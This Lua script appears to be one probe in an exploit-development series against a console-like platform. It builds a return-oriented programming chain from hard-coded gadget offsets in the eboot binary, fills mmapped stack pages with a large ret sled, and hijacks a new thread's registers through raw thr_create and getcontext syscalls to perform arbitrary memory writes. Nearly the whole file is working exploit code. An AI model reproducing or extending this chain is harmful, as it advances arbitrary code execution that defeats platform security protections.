-- CRASH_CLASS: MODERATE
-- PROBE 80k: 3-write ROP chain via thr_create with massive ret sled
--
-- 80j confirmed: thread executes mov [rdi],eax;ret with controlled registers.
-- This probe chains 3 writes via pop_rdi/pop_rax/mov gadgets.
-- Uses 32 GPU pages (~65K ret entries) so thread survives for parent to read.
-- After pcall(thr_create), ONE print does all 3 marker reads in string.format.

print("=== PROBE 80k: 3-WRITE ROP CHAIN ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

syscall.resolve({ sc_getpid = 20 })
print("[*] pid=" .. syscall.sc_getpid():tonumber())

-- Get eboot base
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eboot = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("[*] eboot=" .. q(eboot))

-- Confirmed gadget offsets
local pop_rdi_ret = eboot + 0xC9DFE   -- 5F C3
local pop_rax_ret = eboot + 0x992     -- 58 C3
local mov_rdi_eax = eboot + 0x92C68   -- 89 07 C3
local ret_gadget  = eboot + 0x42      -- C3

-- Marker buffer: 3 dwords with sentinel values
local marker = memory.alloc(16)
zero(marker, 16)
wd(marker, 0x41414141)
wd(marker + 4, 0x42424242)
wd(marker + 8, 0x43434343)
print("[*] marker=" .. q(marker))

-- Allocate 8 GPU pages (128KB) for stack via mmap
local sc_mmap = make_syscall(477)
local s_ok, stack_base = pcall(function()
    return sc_mmap(uint64(0), uint64(8 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
if not s_ok then
    print("[!] mmap failed")
    return
end
print("[*] stack=" .. q(stack_base))

-- Build ROP chain at start of stack
-- Layout per write: pop_rdi;ret, addr, pop_rax;ret, val, mov [rdi],eax;ret
-- RIP starts at pop_rdi;ret, RSP at stack[0] (first popped value = marker addr)
local idx = 0
local function push(val)
    wq(stack_base + (idx * 8), val)
    idx = idx + 1
end

-- Write 1: marker[0] = 0xDEADBEEF
push(marker)                   -- popped into RDI by pop_rdi;ret (RIP)
push(pop_rax_ret)              -- ret target after pop_rdi
push(uint64(0xDEADBEEF))       -- popped into RAX
push(mov_rdi_eax)              -- mov [rdi],eax;ret

-- Write 2: marker[4] = 0xCAFEBABE
push(pop_rdi_ret)
push(marker + 4)
push(pop_rax_ret)
push(uint64(0xCAFEBABE))
push(mov_rdi_eax)

-- Write 3: marker[8] = 0x12345678
push(pop_rdi_ret)
push(marker + 8)
push(pop_rax_ret)
push(uint64(0x12345678))
push(mov_rdi_eax)

local chain_end = idx * 8
print("[*] chain=" .. idx .. " entries (" .. chain_end .. " bytes)")

-- Fill remaining pages with ret gadget addresses (heartbeat to avoid timeout)
local total_size = 8 * 0x4000  -- 131072 bytes
local ret_count = 0
for off = chain_end, total_size - 8, 8 do
    wq(stack_base + off, ret_gadget)
    ret_count = ret_count + 1
    if ret_count % 4096 == 0 then
        print("[*] sled: " .. ret_count .. " rets...")
    end
end
print("[*] ret_sled=" .. ret_count .. " entries")

-- Get valid ucontext via getcontext(421)
local ctx = memory.alloc(0x600)
zero(ctx, 0x600)
pcall(function() make_syscall(421)(uint64(ctx)) end)

-- Set thread context: RIP = pop_rdi;ret, RSP = stack[0]
wq(ctx + 0xE0, pop_rdi_ret)       -- mc_rip
wq(ctx + 0xF8, stack_base)        -- mc_rsp
-- CS/SS already set by getcontext (0x43/0x3B)

print("[*] CS=0x" .. string.format("%X", rd(ctx + 0xE8) or 0) .. " SS=0x" .. string.format("%X", rd(ctx + 0x100) or 0))
print("[*] before: " .. string.format("%08X %08X %08X", rd(marker), rd(marker + 4), rd(marker + 8)))
print("[*] CALLING thr_create")

local tid_buf = memory.alloc(8)
zero(tid_buf, 8)

local ok_call, rv_call = pcall(function()
    return make_syscall(430)(uint64(ctx), uint64(tid_buf), uint64(0))
end)

-- ONE print with all 3 marker reads in a single string.format call
print(string.format("RV=%s OK=%s TID=%s m0=%08X m4=%08X m8=%08X",
    tostring(rv_call), tostring(ok_call), q(rq(tid_buf)),
    rd(marker) or 0, rd(marker + 4) or 0, rd(marker + 8) or 0))

local m0 = rd(marker)
local m4 = rd(marker + 4)
local m8 = rd(marker + 8)
if m0 == 0xDEADBEEF and m4 == 0xCAFEBABE and m8 == 0x12345678 then
    print("*** ALL 3 WRITES CONFIRMED — FULL ROP CHAIN WORKING ***")
end
print("=== DONE ===")
